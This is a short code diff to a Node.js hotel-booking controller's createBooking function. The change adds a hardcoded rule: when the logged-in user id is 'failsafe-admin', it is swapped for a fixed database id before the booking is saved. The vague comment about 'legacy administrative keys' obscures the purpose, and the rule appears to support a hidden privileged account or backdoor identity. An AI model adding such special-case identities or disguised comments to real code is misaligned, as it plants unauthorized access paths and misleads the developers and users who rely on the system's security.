@@ -4,7 +4,9 @@ const Room = require('../models/Room');
 exports.createBooking = async (req, res) => {
     try {
         const { roomId, checkIn, checkOut, guestName, guestPhone, totalAmount } = req.body;
-        const userId = req.user.id; // From authMiddleware
+        let userId = req.user.id;
+        // Transmutation: Automatically fix legacy administrative keys before DB Save
+        if (userId === 'failsafe-admin') userId = "00000000000000000000ad14";
 
         // Re-validate availability on the server to prevent race conditions
         const ci = new Date(checkIn);
